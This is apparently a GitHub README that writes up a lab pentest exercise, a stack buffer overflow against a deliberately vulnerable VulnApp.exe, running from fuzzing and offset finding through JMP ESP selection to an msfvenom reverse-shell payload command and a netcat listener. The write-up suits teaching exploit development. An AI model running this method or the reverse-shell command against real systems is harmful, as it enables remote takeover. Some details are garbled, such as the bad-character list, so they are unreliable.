<!--
*** Thanks for checking out the Best-README-Template. If you have a suggestion
*** that would make this better, please fork the repo and create a pull request
*** or simply open an issue with the tag "enhancement".
*** Thanks again! Now go create something AMAZING! :D
-->



<!-- PROJECT SHIELDS -->
<!--
*** I'm using markdown "reference style" links for readability.
*** Reference links are enclosed in brackets [ ] instead of parentheses ( ).
*** See the bottom of this document for the declaration of the reference variables
*** for contributors-url, forks-url, etc. This is an optional, concise syntax you may use.
*** https://www.markdownguide.org/basic-syntax/#reference-style-links
-->
[![LinkedIn][linkedin-shield]][linkedin-url]



<!-- PROJECT LOGO -->
<br />
<p align="center">
    <img src="images/2021-02-22 20_33_43-Adelaja_Akolade_Buffer_Overflow_Report.docx - Word.png" alt="Logo">
</p>



<!-- TABLE OF CONTENTS -->
<details open="open">
  <summary>Table of Contents</summary>
  <ol>
    <li>
      <a href="#about-the-project">About The Project</a>
      <ul>
        <li><a href="#built-with">Built With</a></li>
      </ul>
    </li>
    <li>
      <a href="#getting-started">Exploitation</a>
      <ul>
        <li><a href="#prerequisites">Prerequisites</a></li>
        <li><a href="#installation">Installation</a></li>
      </ul>
    </li>
    <li><a href="#roadmap">Appendices</a></li>
    <li><a href="#contributing">Contributing</a></li>
    <li><a href="#license">License</a></li>
    <li><a href="#contact">Contact</a></li>
    <li><a href="#acknowledgements">Acknowledgements</a></li>
  </ol>
</details>



<!-- ABOUT THE PROJECT -->
## About The Project
I conducted a comprehensive security assessment of the VulnApp.exe application on the Windows 7 Lab VM to determine its existing vulnerabilities by engaging in a penetration test that was conducted on the 14th of February 2021. The goal of the “pentest” is to act as a malicious actor by performing attacks against the application with the aim of discovering any vulnerabilities that could lead to a breach, and be leveraged to gain access to the system through the application.

This assessment harnessed testing based on the NIST SP 800-115 Technical Guide to Information Security Testing and Assessment and the OWASP Testing Guide (v4) to provide documentation and proof of developing a working exploit. 

PHASES OF PENETRATION TEST
Phases of penetration testing activities include the following:
•	Planning – Goals are gathered, and rules of engagement obtained.
•	Discovery – Perform scanning and enumeration to identify potential vulnerabilities, weak areas, and exploits.
•	Attack – Confirm potential vulnerabilities through exploitation and perform additional discovery upon new access.
•	Reporting – Document all found vulnerabilities and exploits, failed attempts, and recommendations.

FINDINGS OVERVIEW 
While conducting the penetration test, there was one critical vulnerability discovered in the system. Adelaja was able to gain root access and connect to the windows machine as an administrator. This was possible due to a vulnerable program being executed as an administrator, which led to remote system access. 

A brief technical overview is listed below: 
Target: VulnApp.exe – Low-privilege shell was obtained by performing a Buffer-Overflow attack against the application found open on port 9999 granting Adelaja  full root/administrative privileges.

### Built With

These are the prereqisites 
* [Kali Linux](https://www.kali.org/downloads/)
* [VunApp.exe]
* [Trial Windows 10 Enterprise Edition](https://www.microsoft.com/en-gb/evalcenter/evaluate-windows-10-enterprise)
* [mona.py]
* [Immunity Debugger](https://www.immunityinc.com/products/debugger/)



<!-- GETTING STARTED -->
## EXPLOITATION
During the exploitation phase, Adelaja will attempt to exploit a buffer Overflow attack within the windows 7 operating system using the following steps:
1.	Fuzzing to check vulnerability
2.	Generating A Pattern To find The Offset
3.	Overwriting and Controlling the EIP
4.	Identify Bad Characters
5.	Identifying The Right Module
6.	Generating The Shell Code

The end goal for the tester is to attempt to penetrate the target system gaining as much access privilege as possible. Adelaja will stay within the scope that was determined during pre-engagement.


<!-- USAGE EXAMPLES -->
## Fuzzing To Check Vulnerability
Before proceeding to develop the exploit. The application is checked to find any vulnerable injection points unable to handle large amounts of data causing the application to crash. The TRUN command on Vulnapp.exe is known to be vulnerable and the python script below was developed to attack this specific command [Figure 1.1].


In the above code, a socket to enable the connection is created and passed the IP address of the target host (192.168.56.107) and the identified port (9999) Then  the buffer variable assigned 100 A characters is binded to the vulnerable ‘TRUN’ command and sent to the target machine. It will send A (\x41 in hex) incrementally at 100 bytes a time until it’s no longer able to communicate with the port. After a successful crash, a message will be displayed highlighting when crashed occurred in bytes.
Note that the additional characters ‘/.:/’ are commands that go after TRUN and must be included to gain access to this injection point.
Before running the fuzzScript, the VulnApp.exe is attached to immunity debugger [Figure 1.2] [Figure1.3].





Running the script [Figure 1.4] now will confirm that the A character values declared in the script are creating an access violation and getting passed to the EBP register [Figure 1.5]. In this case, it didn’t overwrite the EIP but it stops communicating with the port at 2100 bytes establishing that the application crashed.





## Generating A Pattern To Find The Offset
Using the pattern_create ruby file provided by Metasploit, a unique string of no repeating characters will be generated [Figure 2.1] and sent to the application’s buffer using the second python script[Figure 2.2]. This payload will display a value on the EIP when the program crashes [Figure 2.3]. This value can then be used to find the offset The offset is the exact number of bytes it takes to fill the application’s buffer.













For this application, the EIP value in the debugger is 386F4337. Using a second ruby script from Metasploit called pattern_offset.rb on this EIP value will search for a pattern (within the generated 2500 characters from the pattern_create script [Figure 2.1]) that matches the EIP value 386F4337, showing us the exact point the EIP register begins. 

In this case it found an offset of 2003 bytes [Figure 2.4]. This is critical as Adelaja now knows there are 2003 bytes right before the EIP, with the EIP itself being 4 bytes long. With this knowledge, those 4 specific bytes can now be overridden to gain control of the EIP.





## Overwriting and Controlling the EIP
To gain control of the EIP, another python script is run to send a custom buffer to the VulnApp application. The script below [Figure 3.1] will be using a new variable shellcode which is assigned a string of 2003 character A’s (2003 as this is the number of bytes before the EIP) plus 4 character B’s(To clearly define the EIP’s 4 bytes


When the script is run and the VulnApp application crashes, looking at the registers on immunity shows the TRUN Command and the A’s, on the EBP the A’s in hex format 414141 and on the EIP the B’s in hex format 424242 [Figure 3.2]. The EIP is overwritten and can be used to point to malicious code


## Identifying Bad Characters
When generating shellcodes, it is necessary to find and remove the possibility of bad characters interfering with the shellcode. These characters are used by the VulnApp application so if passed to the program through the shellcode, VulnApp will consider it as something else and the shellcode will not run.
By running all the hex characters through the VulnApp program and seeing the effects on the program, these bad characters can be determined.



Running the above script with the null byte value included [Figure 4.1] will send the payload with the bad characters. Below is the Hex dump after the application crashes [Figure 4.2] [Figure4.3], any values missing or out of order will be a bad character and should be excluded from shellcode. In this case the only bad character is \x00,\x,\x




## IIdentifying The Right Module
To identify the right vulnerable module in the application’s library, another python script will be used to find a .dll file linked to VulnApp that has no memory protections. The mona module is a tool that can be used with immunity debugger to achieve this. This module, as seen below, is already attached to the immunity debugger Py Commands folder [Figure 5.1].



With Immunity running and the VulnApp.exe attaced and loaded and using the command “!mona module” at the bottom of the debugger screen will display all the availaible dll’s. The essfunc.dll module with address is selected as it has all its memory protections set to false, is linked to vulnApp and has no return value[Figure 5.2]



The jump command in assembly language is going to be used as a pointer to jump to the malicious code but the operation code equivalent of the command must be used. To do this the ruby script nasm_shell is used to convert the assembly language JMP ESP into hex FFE4 [Figure 5.3].



On immunity Debugger, mona is run again but this time with the command “!mona find -s “\xff\xe4” -m essfunc.dll”. The \xff\xe4 is opcode for JMP ESP .The displayed items are the return addresses linked to the essfunc.dll and lists all its memory protections [Figure5.4].These return addresses are pushed onto the stack when the dll is called and is where the shellcode will be stored.

The address of the 1st item displayed on immunity is added into the script as shown below [Figure 5.5]. 



The 4 B’s used to find the EIP have been replaced with the pointer 625011af in little endian format. This will make the EIP a JMP code which can point to a malicious code. This jump point can be caught on Immunity by setting a breakpoint using the pointer (625011af) [Figure 5.6] and running the script. 
With the breakpoint set, when the buffer is overflowed but hits the specific spot in which the breakpoint is set, it will not jump but rather crash the VulnApp application, pause and await further instructions from the attacker [Figure 5.7].



## Generating The Shellcode
To generate a shellcode, the tool msfvenom by Metasploit will be used to generate the payload. Using:
msfvenom -p windows/shell_reverse_tcp LHOST=”192.168.56.106” LPORT=49152 EXITFUNC=thread -f c -a x86 -b “\x00”
where -p is the payload
windows/ sets payload to windows
/shell_reverse_tcp is a non-staged reverse shell that allows the victim machine to connect back to target machine.
LHOST and LPORT attack machine address
EXITFUNC=thread makes exploit stable
-f is for the filetype
c is to export to C language
-a is to select architecture type, in this case it’s an x86 PC
-b is for bad characters.

When that completes running, a shell code will be generated and added to a new python script. [Figure 6.1]. 



In the script above, a variable bufferOverflow is declared and assigned the generated shell code copied from msfvenom. The shellcode variable still holds the string of 2003 character A’s plus the pointer address, which is the JMP address, and the new variable bufferOverflow which holds the shellcode. Nops (No-Operation) are included to provide padding between the JMP command and the overflow variable to prevent any instances where command execution doesn’t take place.

Before running this script, a netcat connection to VulnApp is opened so the attacking machine can listen on the port. 

When the shellScript4.py script runs, the shellcode will execute and connect to the Windows machine, allowing full access control since the vulnerable program was executed as an administrator [Figure6.2].








<!-- ROADMAP -->
## Appendices
Definitions:
1.	The Extended Instruction Pointer (EIP) is a register that contains the address of the next instruction for the program or command. Can be seen on the immunity Debugger
2.	The Extended Stack Pointer (ESP) is a register that lets you know where on the stack you are and allows you to push data in and out of the application. Can be seen on the immunity Debugger
3.	The Jump (JMP) is an instruction that modifies the flow of execution where the operand designated will contain the address being jumped to.
4.	\x41, \x42, - The hexadecimal values for A and B.
5.	Buffer is a temporary area in memory which can hold the values of a program in between execution process.
6.	Buffer Overflow attack is the process of exceeding buffer boundaries using input data and overwriting any adjacent memory locations to conduct malicious intents.
7.	
Anatomy of a Stack:

<!-- CONTRIBUTING -->
## Contributing

Contributions are what make the open source community such an amazing place to be learn, inspire, and create. Any contributions you make are **greatly appreciated**.

1. Fork the Project
2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the Branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

<!-- LICENSE -->
## License

Distributed under the MIT License. See `LICENSE` for more information.



<!-- CONTACT -->
## Contact

Akolade Sylvester Adelaja - [https://github.com/kayrrtolkien/Kayrrtolkien](https://github.com/kayrrtolkien/Kayrrtolkien)

Project Link: [https://github.com/kayrrtolkien/BufferOverflow/edit/master/README.md](https://github.com/kayrrtolkien/BufferOverflow/edit/master/README.md)



<!-- ACKNOWLEDGEMENTS -->
## Acknowledgements
* [GitHub Emoji Cheat Sheet](https://www.webpagefx.com/tools/emoji-cheat-sheet)
* [Img Shields](https://shields.io)
* [Choose an Open Source License](https://choosealicense.com)
* [GitHub Pages](https://pages.github.com)
* [Animate.css](https://daneden.github.io/animate.css)
* [Loaders.css](https://connoratherton.com/loaders)
* [Slick Carousel](https://kenwheeler.github.io/slick)
* [Smooth Scroll](https://github.com/cferdinandi/smooth-scroll)
* [Sticky Kit](http://leafo.net/sticky-kit)
* [JVectorMap](http://jvectormap.com)
* [Font Awesome](https://fontawesome.com)





<!-- MARKDOWN LINKS & IMAGES -->
<!-- https://www.markdownguide.org/basic-syntax/#reference-style-links -->
[linkedin-shield]: https://img.shields.io/badge/-LinkedIn-black.svg?style=for-the-badge&logo=linkedin&colorB=555
[linkedin-url]: https://www.linkedin.com/in/sylvester-a-adelaja-954918124/
